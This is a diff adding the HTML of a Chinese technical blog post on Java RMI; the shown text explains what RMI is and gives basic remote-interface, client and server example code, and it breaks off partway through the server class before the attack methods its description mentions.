@@ -1,0 +1,1331 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
+  <meta name="author" content="Xvsf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="RMI基础及几种攻击方式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RMI">
+<meta property="og:url" content="http://xvshifu.github.io/2025/09/20/RMI/index.html">
+<meta property="og:site_name" content="Xvsf blogs">
+<meta property="og:description" content="RMI基础及几种攻击方式">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053743.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053449.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054922.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054982.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054278.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054504.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250804062.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054938.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054839.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054384.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054590.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054700.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054805.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055474.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055635.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055596.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055311.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055578.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055804.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056355.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056610.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056850.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056845.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056633.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056496.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056087.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056321.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057316.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057112.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057390.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057434.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057072.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057553.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057747.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057010.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058476.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058357.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805468.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058662.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058959.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058480.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058618.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805487.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058891.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058990.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058314.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058084.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058089.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058574.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059987.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806502.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059539.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059580.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059524.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059631.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059585.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059455.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059526.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806495.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059518.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059247.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100821.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059422.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100050.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100488.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100413.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100826.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100956.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100633.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100785.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100700.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100902.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100629.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101578.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100270.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101064.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250807873.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101630.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101934.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101994.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101732.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101959.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101134.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102514.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102601.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102239.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102908.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102432.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102528.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102834.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102594.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102245.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102876.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250808002.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102343.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102929.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102257.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102391.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102266.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102994.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102963.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102427.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103076.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250809034.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103446.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103011.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103562.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103340.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103591.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104922.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104627.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104501.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104209.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104888.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104542.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104061.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242105634.png">
+<meta property="article:published_time" content="2025-09-20T07:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-25T00:18:59.564Z">
+<meta property="article:author" content="Xvsf">
+<meta property="article:tag" content="java 学习">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053743.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>RMI - Xvsf blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/xm_custom/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>🖋️ Hello My Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="RMI"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-20 15:00" pubdate>
+          2025年9月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          55 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">RMI</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年9月25日 早上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="1、RMI是什么"><a href="#1、RMI是什么" class="headerlink" title="1、RMI是什么"></a>1、RMI是什么</h2><blockquote>
+<p>Java RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。这样做的特点如下：</p>
+<p>优点：避免重复造轮子；</p>
+<p>缺点：调用过程很慢，而且该过程是不可靠的，容易发生不可预料的错误，比如网络错误等；</p>
+<p>在RMI中的核心是远程对象（remote object），除了对象本身所在的虚拟机，其他虚拟机也可以调用此对象的方法，而且这些虚拟机可以不在同一个主机上。每个远程对象都要实现一个或者多个远程接口来标识自己，声明了可以被外部系统或者应用调用的方法（当然也有一些方法是不想让人访问的）。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053743.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="2、RMI-基本实现"><a href="#2、RMI-基本实现" class="headerlink" title="2、RMI 基本实现"></a>2、RMI 基本实现</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException, NotBoundException &#123;<br>        